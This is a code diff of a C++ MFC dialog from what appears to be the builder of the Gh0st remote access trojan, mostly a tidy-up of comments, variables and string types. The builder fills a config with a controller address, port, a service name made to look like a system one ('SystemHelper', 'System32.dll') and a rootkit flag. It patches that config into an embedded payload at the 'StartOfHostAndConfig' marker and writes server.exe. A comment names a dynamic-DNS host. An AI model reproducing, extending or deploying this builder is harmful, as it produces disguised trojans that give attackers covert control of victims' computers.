@@ -33,51 +33,32 @@ struct authans
 	char Ver;
 	char Status;
 };
-/*
-struct ONLINE_INFO
-{
-char TestString1[17];
-char ServiceName[50];
-char ServiceDisplayName[50];
-char ServiceDescription[150];
-char DllName[50];
-char Beizhu[50];//备注
-bool isRootkit;
-}online_info =
-{
-"292.268.1.1",
-"ser",
-"123",
-"111",
-"dll.dll",
-"",
-false,
-};
-*/
+
 struct DLL_INFO
 {
 	CHAR IdChar[32];
-	WCHAR LoginAddr[150];
+	CHAR LoginAddr[150];
 	UINT LoginPort;
 	char ServiceName[50];
 	char Dllname[50];
 	char ReMark[50];
 	bool isRootkit;
-}dll_info =
+} dll_info =
 {
 	"StartOfHostAndConfig",
-	L"127.0.0.1",		//127.0.0.1 192.168.1.145
+	"127.0.0.1",		//127.0.0.1 192.168.1.145 lkyfire.vicp.net
 	80,
 	"SystemHelper",
 	"System32.dll",
 	"lx",
 	false,
 };
+
 /////////////////////////////////////////////////////////////////////////////
 // CBuildServerDlg dialog
 
 CBuildServerDlg::CBuildServerDlg(CWnd* pParent /*=NULL*/)
-	: CDialogEx(CBuildServerDlg::IDD, pParent)
+	: CDialogEx(CBuildServerDlg::IDD, pParent), m_listen_port(0), m_max_connections(1024), m_connect_auto(0)
 {
 	//{{AFX_DATA_INIT(CBuildServerDlg)
 	m_url = _T("");
@@ -149,9 +130,6 @@ BOOL CBuildServerDlg::OnInitDialog()
 			((Cgh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "ServiceName", m_servicename));
 
 		OnEnableHttp();
-		char strVer[] = "Franket", strTitle[] = "X-fire";
-
-		int nEditControl[] = { IDC_URL, IDC_SERVICE_DISPLAYNAME, IDC_SERVICE_DESCRIPTION };
 	}
 
 	if (m_bFirstShow)
@@ -178,14 +156,12 @@ BOOL CBuildServerDlg::OnInitDialog()
 
 void CBuildServerDlg::OnUp3322()
 {
-	// TODO: Add your control notification handler code here
 	CUpipDlg dlg(this);
 	dlg.DoModal();
 }
 
 void CBuildServerDlg::OnEnableHttp()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData(true);
 	//	GetDlgItem(IDC_DNS_STRING)->EnableWindow(!m_enable_http);
 	GetDlgItem(IDC_URL)->EnableWindow(m_enable_http);
@@ -195,12 +171,12 @@ void CBuildServerDlg::OnEnableHttp()
 
 int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)
 {
-	int   da, i, j;
+	int da, j;
 	if (isizeSub == 0)
 		da = strlen(strSub);
 	else
 		da = isizeSub;
-	for (i = 0; i < iSizeMem; i++)
+	for (int i = 0; i < iSizeMem; i++)
 	{
 		for (j = 0; j < da; j++)
 			if (strMem[i + j] != strSub[j])
@@ -214,7 +190,6 @@ int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSu
 
 void CBuildServerDlg::OnBuild()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData(true);
 	if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty())
 	{
@@ -237,7 +212,6 @@ void CBuildServerDlg::OnBuild()
 		return;
 
 #ifdef _UNICODE
-	char tempLoginFtp[MAX_PATH] = { 0 };
 	char tempLoginAddr[MAX_PATH] = { 0 };
 
 	char tempServiceName[MAX_PATH] = { 0 };
@@ -254,30 +228,29 @@ void CBuildServerDlg::OnBuild()
 	WideCharToMultiByte(CP_ACP, 0, m_dllname.GetBuffer(0), -1, tempDllName, sizeof(tempDllName) / sizeof(tempDllName[0]), NULL, FALSE);
 	WideCharToMultiByte(CP_ACP, 0, m_beizhu.GetBuffer(0), -1, tempBeizhu, sizeof(tempBeizhu) / sizeof(tempBeizhu[0]), NULL, FALSE);
 
-	lstrcpyW(dll_info.LoginAddr, m_url);
+	TCHAR* str = m_url.GetBuffer(m_url.GetLength());
+	//lstrcpyA(dll_info.LoginAddr, str);
+	WideCharToMultiByte(CP_ACP, NULL, str, wcslen(str), dll_info.LoginAddr, 150, NULL, NULL);
 	dll_info.LoginPort = 808;	//atoi((LPWSTR)m_remote_port);
 
 	lstrcpyA(dll_info.ServiceName, tempServiceName);
 	lstrcpyA(dll_info.Dllname, tempDllName);
 #else
-	lstrcpyA(dll_info.Dllname,m_dllname.GetBuffer(0));
+	lstrcpyA(dll_info.Dllname, m_dllname.GetBuffer(0));
 
-	lstrcpyA(dll_info.LoginAddr,m_remote_host.GetBuffer(0));
+	lstrcpyA(dll_info.LoginAddr, m_remote_host.GetBuffer(0));
 	dll_info.LoginPort = atoi(m_remote_port.GetBuffer(0));
-	lstrcpyA(dll_info.ServiceName,m_servicename.GetBuffer(0));
+	lstrcpyA(dll_info.ServiceName, m_servicename.GetBuffer(0));
 #endif
 	///end
 	//////////////////////////////////////////////////////////////////////////////////////
 
-	HRSRC hResInfo;
 	HGLOBAL hResData;
 	DWORD dwSize, dwWritten;
 	LPBYTE p1;
-	HANDLE hFile;
-	// 查找所需的资源
-	hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_MYEXE), _T("MYEXE"));
+	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_MYEXE), _T("MYEXE"));
 	if (hResInfo == NULL) return;
-	// 获得资源尺寸
+
 	dwSize = SizeofResource(NULL, hResInfo);
 	// 装载资源
 	hResData = LoadResource(NULL, hResInfo);
@@ -286,18 +259,17 @@ void CBuildServerDlg::OnBuild()
 	p1 = (LPBYTE)GlobalAlloc(GPTR, dwSize);
 	if (p1 == NULL)     return;
 
-	// 复制资源数据
 	CopyMemory((LPVOID)p1, (LPCVOID)LockResource(hResData), dwSize);
 
 	int iPos1 = MemFindStr((const char *)p1, "StartOfHostAndConfig", dwSize, lstrlenA("StartOfHostAndConfig"));
 
-	CopyMemory((LPVOID)(p1 + iPos1), (LPCVOID)&dll_info, sizeof(DLL_INFO));//填充dll配置信息
+	CopyMemory((LPVOID)(p1 + iPos1), (LPCVOID)&dll_info, sizeof(DLL_INFO));
 
 	TCHAR Path[256];
 	GetCurrentDirectory(256, Path);
 	lstrcat(Path, _T("\\server.exe"));
 	DeleteFile(Path);
-	hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	HANDLE hFile = CreateFile(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if (hFile == NULL) return;
 
 	WriteFile(hFile, (LPVOID)p1, dwSize, &dwWritten, NULL);
@@ -311,7 +283,6 @@ void CBuildServerDlg::OnBuild()
 
 void CBuildServerDlg::OnTestMaster()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData();
 	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
 	{
@@ -325,13 +296,11 @@ void CBuildServerDlg::OnTestMaster()
 
 void CBuildServerDlg::OnSaveasDefault()
 {
-	// TODO: Add your control notification handler code here
 	OnChangeConfig(0);
 }
 
 void CBuildServerDlg::OnConnectAuto()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData(true);
 	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
 }
@@ -358,13 +327,12 @@ DWORD WINAPI CBuildServerDlg::TestMaster(LPVOID lparam)
 	tvSelect_Time_Out.tv_sec = 3;
 	tvSelect_Time_Out.tv_usec = 0;
 
-	hostent* pHostent = NULL;
 #ifdef _UNICODE
 	char myhost[MAX_PATH];
 	wsprintfA(myhost, "%s", pThis->m_remote_host);
-	pHostent = gethostbyname(myhost);
+	hostent * pHostent = gethostbyname(myhost);
 #else
-	pHostent = gethostbyname(pThis->m_remote_host);
+	hostent * pHostent = gethostbyname(pThis->m_remote_host);
 #endif
 	if (pHostent == NULL)
 	{
@@ -380,7 +348,7 @@ DWORD WINAPI CBuildServerDlg::TestMaster(LPVOID lparam)
 	wsprintfA(myport, "%s", pThis->m_remote_port);
 	ClientAddr.sin_port = htons(atoi(myport));
 #else
-	ClientAddr.sin_port	= htons(atoi(pThis->m_remote_port));
+	ClientAddr.sin_port = htons(atoi(pThis->m_remote_port));
 #endif
 
 	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
@@ -394,8 +362,8 @@ DWORD WINAPI CBuildServerDlg::TestMaster(LPVOID lparam)
 	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
 	{
 		bRet = false;
-		goto fail;
 	}
+
 fail:
 	closesocket(sRemote);
 	WSACleanup();
@@ -429,6 +397,5 @@ void CBuildServerDlg::OnChangeConfig(UINT id)
 
 void CBuildServerDlg::OnActiveRootKit()
 {
-	// TODO: Add your control notification handler code here
 	UpdateData(true);
 }
